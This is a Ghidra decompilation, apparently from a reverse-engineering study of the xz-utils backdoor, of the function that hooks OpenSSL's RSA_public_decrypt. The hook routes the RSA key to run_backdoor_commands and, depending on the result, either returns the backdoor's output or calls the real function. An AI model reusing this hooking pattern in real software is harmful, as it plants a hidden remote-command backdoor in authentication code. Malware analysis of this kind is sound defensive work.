// /home/kali/xzre-ghidra/xzregh/10A240_hook_RSA_public_decrypt.c
// Function: hook_RSA_public_decrypt @ 0x10A240
// Calling convention: __stdcall
// Prototype: int __stdcall hook_RSA_public_decrypt(int flen, uchar * from, uchar * to, RSA * rsa, int padding)


/*
 * AutoDoc: Replacement for RSA_public_decrypt: it ensures the PLT pointer is resolved, hands the RSA key to run_backdoor_commands (passing
 * a do_orig flag by reference), and either returns the backdoor’s result or forwards the call to the genuine OpenSSL symbol
 * depending on whether the dispatcher consumed the ciphertext.
 */

#include "xzre_types.h"

int hook_RSA_public_decrypt(int flen,uchar *from,uchar *to,RSA *rsa,int padding)

{
  pfn_RSA_public_decrypt_t UNRECOVERED_JUMPTABLE;
  BOOL BVar1;
  int iVar2;
  pfn_RSA_public_decrypt_t RSA_public_decrypt;
  BOOL call_orig;
  int result;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->RSA_public_decrypt,
     UNRECOVERED_JUMPTABLE != (pfn_RSA_public_decrypt_t)0x0)) {
    if (rsa != (RSA *)0x0) {
      result = 1;
      BVar1 = run_backdoor_commands(rsa,global_ctx,(BOOL *)&result);
      if (result == 0) {
        return BVar1;
      }
    }
                    /* WARNING: Could not recover jumptable at 0x0010a2bd. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    iVar2 = (*UNRECOVERED_JUMPTABLE)(flen,from,to,rsa,padding);
    return iVar2;
  }
  return 0;
}

